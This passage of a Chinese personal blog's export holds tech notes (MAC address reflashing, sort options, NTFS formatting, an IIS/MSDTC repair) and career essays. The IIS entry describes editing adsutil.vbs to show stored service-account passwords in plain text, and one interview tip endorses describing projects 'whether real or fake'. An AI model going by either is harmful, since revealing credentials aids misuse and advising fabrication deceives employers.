润建设</p><p>深圳</p><p>建筑业</p><p>48.17</p><p>80</p><p>0210.HK</p><p>达芙妮国际</p><p>中国香港</p><p>制造业</p><p>46.65</p><p>81</p><p>2020.HK</p><p>安踏体育</p><p>中国香港</p><p>制造业</p><p>46.27</p><p>82</p><p>600496.SH</p><p>精工钢构</p><p>上海</p><p>建筑业</p><p>45.88</p><p>83</p><p>SOL</p><p>浙江昱辉</p><p>美国</p><p>制造业</p><p>45.82</p><p>84</p><p>600067.SH</p><p>冠城大通</p><p>上海</p><p>制造业</p><p>44.86</p><p>85</p><p>002269.SZ</p><p>美邦服饰</p><p>深圳</p><p>批发和零售贸易</p><p>44.74</p><p>86</p><p>002242.SZ</p><p>九阳股份</p><p>深圳</p><p>制造业</p><p>43.23</p><p>87</p><p>600303.SH</p><p>曙光股份</p><p>上海</p><p>制造业</p><p>43.23</p><p>88</p><p>600183.SH</p><p>生益科技</p><p>上海</p><p>制造业</p><p>43.17</p><p>89</p><p>000418.SZ</p><p>小天鹅</p><p>深圳</p><p>制造业</p><p>42.93</p><p>90</p><p>0175.HK</p><p>吉利汽车</p><p>中国香港</p><p>制造业</p><p>42.89</p><p>91</p><p>600327.SH</p><p>大厦股份</p><p>上海</p><p>批发和零售贸易</p><p>42.58</p><p>92</p><p>600352.SH</p><p>浙江龙盛</p><p>上海</p><p>制造业</p><p>42.25</p><p>93</p><p>600280.SH</p><p>南京中商</p><p>上海</p><p>批发和零售贸易</p><p>42.11</p><p>94</p><p>600331.SH</p><p>宏达股份</p><p>上海</p><p>制造业</p><p>39.64</p><p>95</p><p>000726.SZ</p><p>鲁泰</p><p>深圳</p><p>制造业</p><p>39.22</p><p>96</p><p>600481.SH</p><p>双良股份</p><p>上海</p><p>制造业</p><p>39.15</p><p>97</p><p>1083.HK</p><p>港华燃气</p><p>中国香港</p><p>公用事业</p><p>38.88</p><p>98</p><p>000637.SZ</p><p>茂化实华</p><p>深圳</p><p>制造业</p><p>37.83</p><p>99</p><p>600216.SH</p><p>浙江医药</p><p>上海</p><p>制造业</p><p>37.61</p><p>100</p><p>MR</p><p>迈瑞</p><p>美国</p><p>制造业</p><p>37.42</p>]]></content>
      
      <categories>
          
          <category> HR </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>板载网卡MAC地址丢失恢复方法</title>
      <link href="/2009/12/08/mac-address-loss-recovery-method/"/>
      <url>/2009/12/08/mac-address-loss-recovery-method/</url>
      <content type="html"><![CDATA[<p>最近好多网友询问，自己的主板在刷新BIOS后，板载网卡的MAC地址全部为0了，询问耗子如何写回原来的MAC地址；耗子在以前也陆续写过恢复MAC地址的文章，由于当时写时都是针对某一种情况，因此耗子将所有情况都归纳在一起，方便网友浏览；</p><pre><code>修改MAC地址时，一定要在纯DOS环境下修改。对于启动DOS，如果你的主板支持USB启动，可方便使用U盘来启动DOS（新主板多都支持U盘启动的）；如果不支持U盘启动，可选择使用软盘来启动DOS的方法。U盘DOS启动盘制作工具下载：[http://www.biosrepair.com/bios/USBOOT_1.7.rar](http://www.biosrepair.com/bios/USBOOT_1.7.rar)软盘DOS启动盘制作工具下载：[http://www.biosrepair.com/biosfiles/award/98 BOOT.rar](http://www.biosrepair.com/biosfiles/award/98%20BOOT.rar)对于集成网卡的MAC地址，可在主板RJ-45网卡接口上方或主板PCI槽上找到。如下图：</code></pre><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/www_biosrepair_lanmac.gif" alt="板载网卡MAC地址丢失恢复方法 - suchalin - 为了更好的生活而奋斗！" title="板载网卡MAC地址丢失恢复方法 - suchalin - 为了更好的生活而奋斗！"></p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/www_biosrepair_mac1.gif" alt="板载网卡MAC地址丢失恢复方法 - suchalin - 为了更好的生活而奋斗！" title="板载网卡MAC地址丢失恢复方法 - suchalin - 为了更好的生活而奋斗！"></p><pre><code>现在以上图主板的MAC地址为例分别介绍各种重写MAC地址的方法：一、主板使用AMI BIOS的只要使用AMI的BIOS刷新工具重写网卡的MAC地址就可以。AFUDOS下载地址![板载网卡MAC地址丢失恢复方法 - suchalin - 为了更好的生活而奋斗！](http://blog.atop.fun/wp-content/uploads/netease/other_site/www_biosrepair_go.gif &quot;板载网卡MAC地址丢失恢复方法 - suchalin - 为了更好的生活而奋斗！&quot;)：[http://www.biosrepair.com/biosfiles/afu408p.rar](http://www.biosrepair.com/biosfiles/afu408p.rar)在DOS环境下，运行AFUDOS /M XXXXXXXXXXXX（其中XXXXXXXXXXXX为集成网卡的12位MAC地址。如：AFUDOS /M 00E04D9C6D83）二、针对使用RTL8111C网卡的请使用另一工具刷回MAC地址。工具下载地址![板载网卡MAC地址丢失恢复方法 - suchalin - 为了更好的生活而奋斗！](http://blog.atop.fun/wp-content/uploads/netease/other_site/www_biosrepair_go.gif &quot;板载网卡MAC地址丢失恢复方法 - suchalin - 为了更好的生活而奋斗！&quot;)：[http://www.biosrepair.com/bios/mac-8111c.rar](http://www.biosrepair.com/bios/mac-8111c.rar)该工具DOS下命令为：PG8168 /nodeid XXXXXXXXXXXX（其中XXXXXXXXXXXX为集成网卡的12位MAC地址。如：PG8168 /nodeid 00E04D9C6D83）三、使用Marvell网卡的MAC地址刷回需使用marvell的专用工具。工具下载地址[](http://ftp.biostar.cn/upload/Driver/Other/yukonvpd.rar)![板载网卡MAC地址丢失恢复方法 - suchalin - 为了更好的生活而奋斗！](http://blog.atop.fun/wp-content/uploads/netease/other_site/www_biosrepair_go.gif &quot;板载网卡MAC地址丢失恢复方法 - suchalin - 为了更好的生活而奋斗！&quot;)：[http://www.biosrepair.com/bios/yukonvpd.rar](http://www.biosrepair.com/bios/yukonvpd.rar)DOS命令为：yukonvpd -M XXXXXXXXXXXX（其中XXXXXXXXXXXX为集成网卡的12位MAC地址。-M必须要大写的M，不可用小写的-m。如：yukonvpd -M 00E04D9C6D83）四、AWD BIOS NVIDIA芯片组主板板载网卡MAC，使用AWARD BIOS刷新工具8.4以上版本即可。AWDFLASH下载地址![板载网卡MAC地址丢失恢复方法 - suchalin - 为了更好的生活而奋斗！](http://blog.atop.fun/wp-content/uploads/netease/other_site/www_biosrepair_go.gif &quot;板载网卡MAC地址丢失恢复方法 - suchalin - 为了更好的生活而奋斗！&quot;)：[http://www.biosrepair.com/biosfiles/award/awdflash866.rar](http://www.biosrepair.com/biosfiles/award/awdflash866.rar)在DOS环境下运行awdflash bios.bin /py/sn/nvmac:xxxxxxxxxxx/Wb   （其中XXXXXXXXXXXX为集成网卡的12位MAC地址。注意最后的/Wb参数W一定要是大写。如：awdflash bios.bin /py/sn/nvmac:00E04D9C6D83//Wb）五、对于NF芯片组的主板，可用NF专用的MAC地址修改软件。NF系列主板板载nv网卡的MAC地址刷写工具软件![板载网卡MAC地址丢失恢复方法 - suchalin - 为了更好的生活而奋斗！](http://blog.atop.fun/wp-content/uploads/netease/other_site/www_biosrepair_go.gif &quot;板载网卡MAC地址丢失恢复方法 - suchalin - 为了更好的生活而奋斗！&quot;)：[http://www.biosrepair.com/biosfiles/nvflash.zip](http://www.biosrepair.com/biosfiles/nvflash.zip)在DOS环境下，输入NVFLASH XXXXXXXXXXXX，其中XXXXXXXXXXXX是12位网卡MAC地址。如：NVFLASH 00E04D9C6D83六、针对SIS INTLE RTL8136 RTL8139 RTL8168 ULI5261 ULI5263芯片组的MAC地址修改软件。网卡的MAC地址刷写工具软件![板载网卡MAC地址丢失恢复方法 - suchalin - 为了更好的生活而奋斗！](http://blog.atop.fun/wp-content/uploads/netease/other_site/www_biosrepair_go.gif &quot;板载网卡MAC地址丢失恢复方法 - suchalin - 为了更好的生活而奋斗！&quot;)：[http://www.biosrepair.com/biosfiles/mac.rar](http://www.biosrepair.com/biosfiles/mac.rar)在DOS环境下。输入MAC C XXXXXXXXXX，其中XXXXXXXXXXXX是12位网卡MAC地址。如：MAC C 00E04D9C6D83</code></pre><p>   七、部分主板，可在CMOS设置中，直接修改网卡的MAC地址。</p><pre><code>1、开机进入主板CMOS设置画面，选择“Genie BIOS Setting”    2、进入Genie BIOS Setting,将nVidia Lan MAC Address选项由D ISABLE改为ENABLE;然后在MAC(NV) Address Input选项处按ENTER(回车)键,输入步骤一中获取的12位MAC Address值.然后保存退出CMOS设置即可。    3、重新启动计算器，进入操作系统，板载网卡即可以正常连接使用。</code></pre>]]></content>
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>sort的选项及含义</title>
      <link href="/2009/12/06/the-options-and-meanings-of-sort/"/>
      <url>/2009/12/06/the-options-and-meanings-of-sort/</url>
      <content type="html"><![CDATA[<p><strong>sort的选项及含义</strong></p><p>选项</p><p>含义</p><p>-b</p><p>–ignore-leading-blanks ignore leading blanks 忽略前导空格</p><p>-d</p><p>–dictionary-order 字典排序，仅考虑空格、数字和字符</p><p>-f</p><p>–ignore-case 忽略大小写，这里忽略的比较有意思，是将小写全转为大写后比较</p><p>-g</p><p>–general-numeric-sort 按照数值来比较</p><p>-i</p><p>–ignore-nonprinting 只考虑可打印的字符，忽略任何非显示字符</p><p>-M</p><p>–month-sort 按照月份来比较，是英文的月份哦（compare (unknown) &lt; `JAN’ &lt; … &lt; `DEC’）</p><p>-n</p><p>–numeric-sort 按字符串的数值来比较，可包含前导空格、可选减号、十进制数字、千分位分隔符和可选基数符</p><p>-r</p><p>–reverse 按倒序排列</p><p>-c</p><p>–check 检查待排序文件是否已经按照指定的排列顺序排好序了</p><p>-k</p><p>–key=POS1[,POS2] 指定一个或几个字段作为排序关键字，字段位置从posl开始，到pos2为止(包括post1但是不包括post2),如不指定pos2，则关键字为从posl到行尾。字段和字符的位置从0开始。</p><p>-m</p><p>–merge 只是单纯的合并已经排好序的文件，不再对合并后的文件进行排序</p><p>-o</p><p>–output=FILE 将输出结果保存到指定的文件中，而不是在标准输出（显示器）上显示结果</p><p>-s</p><p>–stable stabilize sort by disabling last-resort comparison</p><p>-S</p><p>–buffer-size=SIZE 设置主内存的大小缓冲区</p><p>-t</p><p>–field-separator=SEP 使用指定的字符作为字段分隔符，默认为空格</p><p>-T</p><p>–temporary-directory=DIR 将临时文档放入指定的临时文件夹，而不是默认的$TMPDIR 或/tmp;</p><p>-u</p><p>–unique 对排序后相同的行只保留一行，即消重</p><p>-z</p><p>–zero-terminated 自然结尾——0bytes，而不是使用一个新行</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>抓住机会 在空白处创业</title>
      <link href="/2009/12/02/take-the-opportunity-to-start-a-business-in-the-air/"/>
      <url>/2009/12/02/take-the-opportunity-to-start-a-business-in-the-air/</url>
      <content type="html"><![CDATA[<p>“往往大行业中存在很多市场空白，一旦你从中找到了合适的市场空白点，那么，你就抓住了创建一家能够持久生存且能够盈利的企业的机会。”</p><p>　　创业，相信许多人都曾渴望过，但是对于大多数人来说，这也只是梦想而已。创业的门槛很高，想要迈进去，你除了要有资金、人力等方面的投入之外，还需要承担巨大的风险。这其中的艰辛，又有多少人能够承受。</p><p>　　其实，在日益激烈的竞争中，市场仍然存在着许多盲点。而一些创业者在找到了市场空白点后，也成为了某个细分市场的领导者。所以要想实现梦想并不是不能实现，关键是要建立缝隙企业，而这将会增大成功的机会。</p><p>　　那么，如何才能寻找到属于自己的市场空白呢？《在空白处创业》一书为我们提供了一些卓有成效地建议。此书不仅介绍了规划和创建一家新的缝隙企业的全过程，包括了解什么是缝隙、如何辨别缝隙的优劣、如何寻找好的企业创意、如何保护缝隙企业创意以及创建缝隙企业的基本步骤等11个方面，同时还列举了人们已经发现的大量市场空白以及成功创业的案例，以期为读者的成功创业指出一条可行之路。</p><p>　　书中，作者桑德为我们提供了一种全新的商业创意，即在一个现存的市场中运营企业，但采用另一种方式。创业者要把重点放在一个较小的、服务不足的市场上，并且把一种独特的、较好的产品或服务带入这个市场中，而这就是我们所说的缝隙。</p><p>　　也就是说，缝隙是一个你可以创建自己企业的领域，并且能够避免任何一位创业者都可以进入所带来的很多烦恼和缺陷。而与此相关的缝隙企业，就是既能满足缝隙市场需要又能赚钱的企业。缝隙企业正是创业者所极力寻求的，但是想要找到它却并不容易。缝隙市场可能是不易察觉的，这是需要创业者去发现，去开拓，去扩大，去独占的。</p><p>　　而在创建缝隙企业之前，你首先所面临的最大挑战与风险就是正确识别与确定缝隙，这需要你仔细评价和确定市场的规模。一旦你找到的缝隙并不是持续、明确的市场细分，它并没有大到可以为企业带来足够的利润，那么你的企业很可能就会被市场淘汰。所以，识别缝隙对于创业者来说至关重要。</p><p>　　如今，许多人已经找到了属于自己的市场空白点，并且创建了成功的企业。</p><p>　　邓娜·约翰逊创建的Seasona公司就是一家典型的缝隙企业。该公司的使命描述为：“为那些具有经前期综合症、准更年期综合症和更年期综合症的妇女提供高质量的产品和信息，以便帮助她们疗养。”她公司的旗舰产品是一种平衡激素的奶油产品，能够方便、快捷地从公司在线商店中购买。邓娜的缝隙企业建立在妇女处于特殊生理阶段对药品和化妆品的需要这一基础之上。</p><p>　　如家，中国最大的经济型连锁酒店品牌，在看似圆满的市场中捕捉到了缝隙，开拓出自己的商业版图。如家的创办者季琦曾如此比喻市场机会：“一个堆满了大石块的玻璃瓶，看起来似乎已经没有空间，实际上大石块的空隙之间，还可以容纳一堆小石子；随后，在小石子的缝隙里，你还能继续填满细沙。”<br>长期以来，酒店业市场结构不合理，其服务主要集中在高端和低端两个部分，而便宜干净的中小型酒店严重匮乏。如家发现了这一拥有普通游客、商务客人、白领等庞大消费群体的空白市场，从而在夹缝中寻觅到了商机。从2002年6月建立到2006年底，如家用4年多的时间就走过了其他酒店近10年的历程，成为中国发展最快、开业酒店数目最多的经济型连锁品牌。正如作者在书中所言：“往往大行业中存在很多市场空白，一旦你从中找到了合适的市场空白点，那么，你就抓住了创建一家能够持久生存且能够盈利的企业的机会。”</p><p>　　从这些例子中我们看到，只要找到合适的缝隙，那么你在某个地区的客户就极易找到，并且不用花钱或少花钱就可与这些客户取得联系。找到一个缝隙后，你不必担心新的进入者及竞争。这里没有竞争，你也不用经常降价。作者告诉我们的缝隙企业，是安全的、能够长期生存的，而且还是能够赢利的企业。</p>]]></content>
      
      <categories>
          
          <category> HR </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>何谓规划职业生涯－我看做人？</title>
      <link href="/2009/12/02/what-is-planning-career-i-am-a-person/"/>
      <url>/2009/12/02/what-is-planning-career-i-am-a-person/</url>
      <content type="html"><![CDATA[<p>我认为人要经过的几个过程主要是以下几点，这也是我判断一个人才的首要过程：做人－》做事－》说话技巧－》管人。</p><p>首先是要学会做人，然后才能给你事情做，在会做事后，还要学会沟通，那么再进一步，你就可以学会如何管理人才了。</p><p>做感兴趣的工作：兴趣是首要条件，可以激发你更多的热情，并长期保持这种热情。如果只是为生存，恐怕很难把工作做好，更不要说再上一层楼了。</p><p>认真负责：我想这一点不需要再多说了，无论对自己还是对别人，认真负责是最基本的要求。没有人喜欢跟不负责的人一起合作，做事不认真只会浪费你和他人更多的时间和精力。</p><p>积极主动：这一点的重要性是不言而喻的，积极做好各项工作，并主动承担更多的职责。多做一些是好事，不去计较当前的得失。斤斤计较的人没什么前途。承担得更多，做得更多，更容易得到机会的青睐。</p><p>注意经验的积累：经验是向上发展的踏脚石，工作的同时也是在不断的吸取经验。不要轻易转行，那样可能会使你以前的经验贬值。保持经验的不断积累，不断增值。</p><p>确定自己的目标：以目前自身的条件和所处的环境为基础，问问自己到底想要什么。每个人都有自己的理想，每个阶段的目标都是你的理想的基石。长期和短期的目标都不可或缺。不要定得太高，那会让你觉得设立目标没有任何意义。但每次都要比上一次的目标要更难以达到，不断挑战自己的潜力。</p><p>不断调整自己的目标：在向你的目标前进的时候，有时会发现目标不符合实际，或跟目前的环境有冲突。及时调整目标，让目标变得更现实可行。有时可能偏离了你的最终目标，但只要是向前的，走一些弯路是不可避免的。不要为一时的挫折而沮丧，人总是在经受挫折后才会变得更强。</p><p>制定长期计划：在确定你的短期目标之后，一定要制定长期计划。很多人实现自己的目标之后，不知道下一步该做什么，于是随波逐流，浪费时间和生命。长期计划让你始终对自己的行动有明确的目标，同时有效地利用时间和精力。</p><p>保持清醒：任何时候都要保持清醒，知道自己做了什么，在做什么，将要做什么。无论是得意还是失意，都是一时的，确保不会因此而失去目标。有时进展非常顺利，以为自己已经打通了任督二脉，于是把目标定得遥不可及。有时又困难重重，觉得永远无法完成任何，于是自暴自弃，彻底放弃自己的目标。这些行为都不可取，保持清醒让你可以继续坚持向目标前进。</p><p>爱惜健康：做这一行一定要有健康的身体，就像职业运行员一样爱惜你的身体。有时健康状况就可以决定你还有多大的潜力，多高的斗志。我不建议为了工作长期熬夜，一定要注意饮食，休息，合理的工作强度。</p><p>最后，请大家分享一下自己在这方面的心得。分享即共赢！</p>]]></content>
      
      <categories>
          
          <category> HR </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>35岁前成功的12条黄金法则</title>
      <link href="/2009/12/02/the-12-golden-rules-of-success-before-age-35/"/>
      <url>/2009/12/02/the-12-golden-rules-of-success-before-age-35/</url>
      <content type="html"><![CDATA[<pre><code>第一章：一个目标  </code></pre><p>　　一艘没有航行目标的船，任何方向的风都是逆风  </p><p>　　1、你为什么是穷人，第一点就是你没有立下成为富人的目标  </p><p>　　2、你的人生核心目标是什么？  </p><p>　　杰出人士与平庸之辈的根本差别并不是天赋、机遇，而在于有无目标。  </p><p>　　3、起跑领先一步，人生领先一大步：成功从选定目标开始  </p><p>　　4、贾金斯式的人永远不会成功  </p><p>　　为什么大多数人没有成功？真正能完成自己计划的人只有5%，大多数人不是将自己的目标舍弃，就是沦为缺乏行动的空想  </p><p>　　5、如果你想在35岁以前成功，你一定在25至30岁之间确立好你的人生目标  </p><p>　　6、每日、每月、每年都要问自己：我是否达到了自己定下的目标  </p><p>　　第二章：两个成功基点  </p><p>　　站好位置，调正心态，努力冲刺，35岁以前成功  </p><p>　　（一）人生定位  </p><p>　　1、人怕入错行：你的核心竞争力是什么？  </p><p>　　2、成功者找方法，失败者找借口  </p><p>　　3、从三百六十行中选择你的最爱  </p><p>　　人人都可以创业，但却不是人人都能创业成功  </p><p>　　4、寻找自己的黄金宝地  </p><p>　　（二）永恒的真理：心态决定命运，35岁以前的心态决定你一生的命运  </p><p>　　1、不满现状的人才能成为富翁  </p><p>　　2、敢于梦想，勇于梦想，这个世界永远属于追梦的人  </p><p>　　3、35岁以前不要怕，35岁以后不要悔  </p><p>　　4、出身贫民，并非一辈子是贫民，只要你永远保持那颗进取的心。中国成功人士大多来自小地方  </p><p>　　5、做一个积极的思维者  </p><p>　　6、不要败给悲观的自己  </p><p>　　有的人比你富有一千倍，他们也会比你聪明一千倍么？不会，他们只是年轻时心气比你高一千倍。  </p><p>　　人生的好多次失败，最后并不是败给别人，而是败给了悲观的自己。  </p><p>　　7、成功者不过是爬起来比倒下去多一次  </p><p>　　8、宁可去碰壁，也不要在家里面壁  </p><p>　　克服你的失败、消极的心态  </p><p>　　（1）找个地方喝点酒  </p><p>　　（2）找个迪厅跳跳舞  </p><p>　　（3）找帮朋友侃侃山  </p><p>　　（4）积极行动起来  </p><p>　　第三章：三大技巧  </p><p>　　1、管理时间：你的时间在哪里，你的成就就在哪里。  </p><p>　　把一小时看成60分钟的人，比看作一小时的人多60倍  </p><p>　　2、你不理财，财不理你  </p><p>　　3、自我管理，游刃有余  </p><p>　　（1）创业不怕本小，脑子一定要好  </p><p>　　（2）可以开家特色店  </p><p>　　（3）做别人不愿做的生意  </p><p>　　第四章：四项安身立命的理念  </p><p>　　35岁以前一定要形成个人风格  </p><p>　　1、做人优于做事  </p><p>　　做事失败可以重来，做人失败却不能重来  </p><p>　　（1）做人要讲义气  </p><p>　　（2）永不气馁  </p><p>　　2、豁达的男人有财运，豁达的女人有帮夫运  </p><p>　　35岁以前搞定婚姻生活  </p><p>　　3、忠诚的原则：35岁以前你还没有建立起忠诚美誉，这一缺点将要困扰你的一生  </p><p>　　4、把小事做细，但不要耍小聪明  </p><p>　　中国人想做大事的人太多，而愿把小事做完美的人太少  </p><p>　　第五章：五分运气  </p><p>　　比尔?盖茨说：人生是不公平的，习惯去接受它吧  </p><p>　　1、人生的确有很多运气的成人：谋事在人，成事在天：中国的古训说明各占一半  </p><pre><code>2、机会时常意外地降临，但属于那些不应决不放弃的人  </code></pre><p>　　3、抓住人生的每一次机会  </p><p>　　机会就像一只小鸟，如果你不抓住，它就会飞得无影无踪  </p><p>　　4、者早一步，愚者晚一步  </p><p>　　第六章：六项要求  </p><p>　　1、智慧  </p><p>　　（1）别人可你以拿走你的一切，但拿不走你的智慧  </p><p>　　（2）巧妙运用自己的智慧  </p><p>　　（3）智者与愚者的区别   </p><p>2、勇气  </p><p>　　（1）勇气的力量有时会让你成为超人  </p><p>　　（2）敢于放弃，敢于舍得  </p><p>　　3、培养自己的领导才能、领袖气质  </p><p>　　（1）激情感染别人  </p><p>　　（2）三o七法则实现领袖气质  </p><p>　　（3）拍板决断能力  </p><p>　　（4）人格魅力  </p><p>　　4、创造性：不要做循规蹈矩的人  </p><p>　　25-35岁是人生最有创造性的阶段，很多成功人士也都产生在这一阶段  </p><p>　　5、明智  </p><p>　　（1）知道自己的长处、短处，定向聚焦  </p><p>　　（2）尽量在自己的熟悉的领域努力  </p><p>　　6、持之以恒的行动力：在你选定行业坚持十年</p>]]></content>
      
      <categories>
          
          <category> HR </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux系统下格式化NTFS</title>
      <link href="/2009/12/01/linux-system-format-ntfs/"/>
      <url>/2009/12/01/linux-system-format-ntfs/</url>
      <content type="html"><![CDATA[<p>安装ntfsprogs<br>yum install ntfsprogs<br>使用下面命令中任何一个格式化<br>mkfs -t ntfs /dev/sdb1<br>或者<br>mkfs.ntfs /dev/sdb1<br>或<br>mkntfs /dev/sdb1<br>如果需要快速格式化加上-f参数<br>mkntfs -f /dev/sdb1</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>找回许久的博客回忆</title>
      <link href="/2009/12/01/find-a-long-blog-back/"/>
      <url>/2009/12/01/find-a-long-blog-back/</url>
      <content type="html"><![CDATA[<p>2009-12-1起重新进入网易博客，书写自己的生活，谈谈自己的计划，并转移学习笔记，为下一个目标奋斗吧！！</p>]]></content>
      
      <categories>
          
          <category> 生活琐事 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>写在当面试官的日子-送给所有正在找工作的人</title>
      <link href="/2007/11/27/write-on-the-day-when-the-interviewer-give-it-to-anyone-looking-for-a-job/"/>
      <url>/2007/11/27/write-on-the-day-when-the-interviewer-give-it-to-anyone-looking-for-a-job/</url>
      <content type="html"><![CDATA[<p> 其实很早我就想写一些关于面试的文章出来,但是一直却不知道从何说起,这几天公司在招一个网络工程师,我又得继续我的面试管日子, 其实当面试管很郁闷的,为什么呢,因为你要面对不同的人,不同的人差异很大.</p><p>　　我们公司招聘的要求很简单!只要具备CCNA的知识就行,但是我不是说你有CCNA证书就能行的呦!而且面试题,基本上都是CCNA的题.</p><p>　　有很多拿了NA的证书,但是做这份考题的时候,只能打30-40分左右,而且很多原理的东西不太多,也许大家觉得我让别人做这种理论性的东西太没有意思了,现在很多人理论不行.但是实际操作能力不错,所以我一般在面试的时候,也会给大家画一个简单的拓朴图,一个连接外网的路由器,一个三层核心交换机,两个二层交换机.交换机下面有三个VLAN,VLAN间控制一些简单的互访问,非常有意思的时候,他们面对这个问题的时候,答案各种各样的,很多人在简历上面写做过XX大项目,用了那些协议之类的,但是一看到这个题,却说不清楚,而且思路都不清楚.今天更有意思,有一个人是什么电脑科技的一个技术主管,来面试这个职位,他上面写的薪水要求是5000以上,但是他答的题,20分都不到,更有意思的时候,我问他有没有配置网络设备,他说配置过WEB界面的,要他把那个拓朴讲清楚.出现了很多的新词语.我直接问答你的最低要求是多少.他说5000,我就说你可能拿不到,因为你的考题不行,他却说他的动手能力很强,我想不明白,他连一个最简单的网络拓朴都说不清楚,有什么资格来而试网络工程师,有什么能力拿5000,何况,我在招人要求上面写明了,要懂一些网络原理与基础,还有具有CCNA的知识(不是指证书).还有一个人同样也是一样的,他说他有配置过华为的,思科的,而且我在他说他的项目上面都写有配置过,他的描述那个拓朴图也是这一点那一样的.思路很乱.其实我很反感,这种工资要求写得高,能力啥都不懂的人,</p><p>　　针对以上所述.所以我给所有正在工作的人一些建议.也是我自己曾经面试的一些经验吧</p><p>　　1.投一份简历一定要看情况,招聘方所要求的是什么,自己不懂的就不要去!如果你是想去转行的话还是可以的</p><p>　　2.在面试之前,好好的了解这家公司是做什么的,他的背景是什么,可能会从事那方面的工作,就好了解工作的一些性质.针对这些有一些复习.面试管问你的时候,你也能答得上．</p><p>　　3.面试管问你有没有做过项目,不要吹得太空,如果你真想吹,那么你也要熟悉一下你所吹的这个项目有那些设备,设备的一些参数,这个项目是具体的一些情况,总之,你要对你所说的项目很熟悉(不管是真的还是假的),一般面试管会很感兴起跟你聊项目的事情．</p><p>　　4.不要在面试管不需要你拿证书的前提下拿出证书,他问你的时候,你就回答拿到就可以了,我个人是最反感给我看证书的人(今天有一个人拿了一大堆证书给我,其实能力很差),不过如果面试管不懂技术还好说,可以拿出来显摆一下!!如果懂技术,人家一看你的证书,就会度控你的能力的呦,所以一定要有实力</p><p>　　5.尽量主动的引导这个面试,让面试管跟你着走,把话题引向你特长的一面,当然如果你的观察能力强,你看出面试管的喜欢之处,可以跟他聊一下他感兴趣的方面! </p><p>　　只写这么多吧,想起再补吧!,希望对大家一帮助吧,以上只是个人意见,并不代表社区, 我们公司己经招到人了,近期不会添加人员,</p>]]></content>
      
      <categories>
          
          <category> HR </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>IIS不能运行ASP程序的问题</title>
      <link href="/2007/11/27/iis-cannot-run-the-asp-program-2/"/>
      <url>/2007/11/27/iis-cannot-run-the-asp-program-2/</url>
      <content type="html"><![CDATA[<p>最近机子的IIS始终不正常，总是说http500错误，然后就无法解析asp文件，网上查了半天，解决方法有，但是都没有涉及到我报的8004e00f的错误。</p><p>后来在系统里不断的乱看，发现MSDTC服务不正常，于是先从这里下手，具体的解决方法如下：并且还要注意：修改密码前请一定停止所有的Internet信息服务，否则后面可能会出错，并且IWAM帐户可能会被锁定。</p><p>如何停止？打开计算机管理，在Internet信息服务上单击右键，选择重新启动IIS服务，在选项中点停止IIS服务，确定即可。</p><p>1、首先进入组件服务，查看组件服务/计算机/我的电脑/COM+应用程序，结果报错“COM+ 无法与 Microsoft 分布式事务协调程序交谈”，无法查看里面的对象。</p><p>2、进入事件查看器，发现msdtc服务没有正常启动。</p><p>3、删除注册表中的键：</p><p>? HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MSDTC</p><p>? HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC</p><p>? HKEY_CLASSES_ROOT\CID</p><p>4、停止MSDTC服务：net stop msdtc</p><p>5、卸载MSDTC服务：msdtc -uninstall</p><p>6、重新安装MSDTC服务：msdtc -install</p><p>7、确认在事件查看器中msdtc服务已经正常启动[这步很关键，如果没有，重新启动下电脑看看]</p><p>8、重新设置IIS的IWAM账号密码。[在计算机管理中的用户管理里]</p><p>进入到c:\inetput\adminscripts目录下：</p><p>在CMD中修改 IWAM 帐户密码 cscript.exe adsutil.vbs set w3svc/wamuserpass “password”</p><p>在CMD中修改 IUSR 帐户密码 cscript.exe adsutil.vbs set w3svc/anonymoususerpass “password”</p><p>password 设置为你想修改的密码，即与第一步中你设置的用户IWAM_<em>**</em>的相同，按回车即可修改完成。</p><p>这里一定要注意：w3svc与wamuserpass之间的杠是/而不是\，否则会出错。</p><p>9、同步IIS metabase中IWAM_MYSERVER的密码，在CMD中：c:\inetpub\adminscripts&gt;adsutil set w3svc/wamuserpass “yourpassword”</p><p>10、同步COM+应用程序所用的IWAM_MYSERVER密码，在CMD中：c:\inetput\adminscripts&gt;cscript synciwam.vbs -v</p><p>11、大功告成！！！！！</p>]]></content>
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>IIS不能运行ASP程序的问题</title>
      <link href="/2007/11/27/iis-cannot-run-the-asp-program/"/>
      <url>/2007/11/27/iis-cannot-run-the-asp-program/</url>
      <content type="html"><![CDATA[<p> 解决中遇到的几个问题，这里补充说明一下，希望能给有同样困惑或者将来会有同样困惑的朋友一点帮助：</p><p>我用的Windows2000版本可能跟可苦可乐的不一样，因此他提供的某些命令我不能使用，后来在微软查到的，下面按Windows2000的说。</p><p>1.解决思路和步骤，基本按照可苦可乐提供的文章操作：</p><p>1）右键单击 我的电脑—-&gt;管理，打开计算机管理界面</p><p>打开 本地用户和组—-&gt;用户</p><p>右键单击 启动IIS进程帐号 IWAM_<strong><strong> （注：</strong></strong>一般是计算机名）</p><p>点击设置密码，设置为一个你想要的密码。</p><p>2）同步IIS 配置数据库密码：</p><p>此处命令有二种，一种可以查看密码，一种是修改密码：</p><p>a.你可以利用查看密码命令查看 IWAM密码，然后把第一步中用户IWAM密码设置为与 查看到的IIS配置数据库密码 一样</p><p>b.也可以利用修改密码命令把IIS配置数据库密码修改为你第一步修改过的IWAM密码。</p><p>二种任你选择。</p><p>查看密码：</p><p>这里注意：在WIN2000中，查看到的密码为星号，若要不为星号，必须要先修改adsutil.vbs文件。</p><p>修改方法：</p><p>a.到c盘 inetpub\adminscripts 找到adsutil.vbs （根据装系统时设定的不同，有的路径可能不一样）</p><p>b.右键单击，用记事本打开</p><p>c.查找 IsSecureProperty = True 注意=前后各有一个空格</p><p>d.将 IsSecureProperty = True 改为 IsSecureProperty = 